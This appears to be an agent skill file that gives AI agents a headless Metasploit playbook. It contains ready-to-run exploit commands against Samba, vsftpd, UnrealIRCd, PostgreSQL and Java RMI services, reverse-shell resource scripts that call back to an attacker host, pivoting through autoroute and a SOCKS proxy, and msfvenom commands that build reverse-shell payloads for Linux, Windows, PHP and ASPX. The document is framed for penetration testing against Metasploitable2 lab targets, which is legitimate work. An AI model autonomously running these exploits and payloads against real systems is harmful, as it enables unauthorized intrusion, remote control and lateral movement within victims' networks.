---
name: "metasploit-automation"
description: "Automated Metasploit Framework (MSF) workflow execution, headless resource scripting (.rc), multi-handler automation, payload generation (msfvenom), module selection, and post-exploitation session interaction for penetration testers and red teams."
---

# Metasploit Automation & Headless Execution Playbook

## Overview
This skill allows agents to control and execute Metasploit Framework tasks headlessly without interactive prompts, utilizing `.rc` resource files, batch execution, and structured automation.

---

## 1. Running Non-Interactive Exploit Tasks
Instead of running interactive `msfconsole`, generate an inline `.rc` script and execute with `-q -r`:

```bash
# Example: Automated Samba exploit execution
cat << 'EOF' > /tmp/samba_exploit.rc
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.14
set RPORT 139
set LHOST 192.168.1.20
set LPORT 4444
set PAYLOAD cmd/unix/reverse
exploit -z
exit -y
EOF

msfconsole -q -r /tmp/samba_exploit.rc
```

---

## 2. Common Metasploitable2 Automation Modules
Quick reference resource scripts for verified targets:

### vsftpd Backdoor
```bash
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <TARGET_IP>; run; exit -y"
```

### UnrealIRCd Backdoor
```bash
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS <TARGET_IP>; set RPORT 6667; run; exit -y"
```

### Samba usermap_script (Instant Root Shell)
```bash
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS <TARGET_IP>; run; exit -y"
```

### PostgreSQL Execution
```bash
msfconsole -q -x "use exploit/linux/postgres/postgres_payload; set RHOSTS <TARGET_IP>; set USERNAME postgres; set PASSWORD postgres; run; exit -y"
```

### Java RMI Registry Execution
```bash
msfconsole -q -x "use exploit/multi/misc/java_rmi_server; set RHOSTS <TARGET_IP>; run; exit -y"
```

---

## 3. Automated Post-Exploitation & Pivoting via Metasploit
Once a Meterpreter session is active (e.g. Session 1):

```bash
# Auto-route internal subnet through session
msfconsole -q -x "use post/multi/manage/autoroute; set SESSION 1; set SUBNET 10.10.10.0; set NETMASK 255.255.255.0; run; exit -y"

# Start Metasploit background SOCKS proxy
msfconsole -q -x "use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; set VERSION 5; run -j"
```

---

## 4. Msfvenom Payload Generation Cheat Sheet
```bash
# Linux x86/x64 Reverse Shell ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f elf -o shell.elf

# Windows x64 Reverse TCP EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o payload.exe

# PHP Reverse Shell
msfvenom -p php/reverse_php LHOST=<KALI_IP> LPORT=4444 -f raw -o shell.php

# ASPX Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f aspx -o shell.aspx
```
